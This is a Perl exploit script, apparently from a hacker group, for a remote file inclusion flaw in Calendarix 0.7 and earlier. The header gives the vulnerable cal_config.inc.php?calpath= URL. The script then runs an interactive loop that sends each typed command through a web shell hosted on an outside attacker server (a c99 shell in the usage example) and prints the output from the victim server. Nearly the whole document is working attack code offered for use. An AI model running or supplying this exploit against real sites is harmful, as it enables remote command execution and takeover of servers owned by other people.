############################################################################
#  _____                 __  __            ___    _                 _   _  #
# |_   _|  ___    __ _  |  \/  |  _ __    / _ \  (_)  ___    ___   | \ | | #
#   | |   / _ \  / _` | | |\/| | | '_ \  | | | | | | / __|  / _ \  |  \| | #
#   | |  |  __/ | (_| | | |  | | | |_) | | |_| | | | \__ \ | (_) | | |\  | #
#   |_|   \___|  \__,_| |_|  |_| | .__/   \___/  |_| |___/  \___/  |_| \_| #
######                           |_|                                  ######                                      
# Calendarix <= 0.7 (multiple vulnerabilities)                             # 
# [#] Found by: TriCk aka Saywhat?                                         #
# [#] Contact: Badnews_saywhat@hotmail.com                                 #
# [#] Site: p0ison.org                                                     #
############################################################################
#
#============================================================================
#++++++++++++++++++++++++ Calendarix <= 0.7 (RFI) +++++++++++++++++++++++++++
#============================================================================
#http://SITE.COM/PATH/cal_config.inc.php?calpath= EVIL SITE???
#
#============================================================================
#Gr33tz 2: TeaMp0isoN // Luit // Al_EPiCa // ACiD // Amarilla // p0ison.org
#============================================================================
# 		 	   		  
#_________________________________________________________________



use LWP::UserAgent;
use HTTP::Request;
use LWP::Simple;
use Getopt::Long;

sub clear{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
}

&clear();

sub banner {
        &clear();
	print "[x] Calendarix <= 0.7 Remote File Inclusion Exploit \n\n";
	print "[x] Author: TriCk aka Saywhat?\n";
	print "[x] Email: Badnews_saywhat@hotmail.com\n";
	print "[x] Website: p0ison.org \n\n";
	print "[x] Location: \n\n";
	print "[x] Coded by QUAKERDOOMER for WinAutoPWN\n";
	print "[x] http://solidmecca.co.nr\n";
	print "[x] (quakerdoomer [[<<at>>]] fmguy.com)\n\n";
	print "[+] Usage:\n";
	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
	print "[+] eX: $0 -vuln \"http://www.someone.com/test/\" -shell \"http://someone.com/c99.txt?\"\n\n";
        exit();
}

my $options = GetOptions (
  'help!'            => \$help, 
  'vuln=s'            => \$vuln, 
  'shell=s'            => \$shell
  );

&banner unless ($vuln);
&banner unless ($shell);

&banner if $banner eq 1;

chomp($vuln);
chomp($shell);

while (){

	print "[shell]:~\$ ";
	chomp($cmd=<STDIN>);

	if ($cmd eq "exit" || $cmd eq "quit") {
		exit 0;
	}

	my $ua = LWP::UserAgent->new;
        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
        chomp($iny);
        my $own = $vuln . "/cal_config.inc.php?calpath=" . $shell . $iny;
        chomp($own);
	my $req = HTTP::Request->new(GET => $own);
	my $res = $ua->request($req);
	my $con = $res->content;
	if ($res->is_success){
		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
	}
           else
             {
                print "[p0c] Exploit failed\n";
                exit(1);
             }
}

#bd0rk

